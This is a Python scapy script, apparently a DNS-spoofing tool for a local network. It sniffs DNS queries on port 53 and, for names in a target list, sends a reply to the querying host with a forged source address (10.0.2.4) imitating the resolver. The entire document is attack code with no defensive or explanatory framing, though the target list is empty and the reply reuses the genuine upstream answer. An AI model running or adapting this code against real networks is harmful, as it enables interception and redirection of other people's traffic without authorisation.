#!/usr/bin/env python3


# Imports
##############################################################################
from scapy.all import *
##############################################################################

# Global Values
##############################################################################
TARGET_DNS_LIST = []
A_RECORD        = 1
INTERFACE       = "eth0"
ROUTING_IP      = "10.0.2.4"            # Routing Ip Address
AN_COUNT        = 1                     # Answer Count
##############################################################################


# Functions
##############################################################################
# DNS Question Records
def get_qname(packet):
    if packet.getlayer(DNSQR).qtype == A_RECORD:
        qname = packet.getlayer(DNSQR).qname.decode("utf-8")
        return qname

# DNS Resource Records
def spoof_dns(packet):
    if packet.haslayer(DNSQR):
        qname = get_qname(packet)
        print(qname)
        if qname in TARGET_DNS_LIST:
            print("Spoofing...")
            response = sr1(
                    IP(dst='8.8.8.8')/
                    UDP(sport=packet[UDP].sport)/
                    DNS(rd=1, id=packet[DNS].id,
                     qd=DNSQR(qname=packet[DNSQR].qname)),
                    verbose=0,
            )
            resp_pkt = IP(dst=packet[IP].src, src=ROUTING_IP)/UDP(
                dport=packet[UDP].sport)/DNS()
            resp_pkt[DNS] = response[DNS]
            send(resp_pkt, verbose=0)


##############################################################################


# Main
##############################################################################
if __name__ == '__main__':
    sniff(iface = INTERFACE, 
          filter="port 53",
          prn = spoof_dns,
          store = 1)
##############################################################################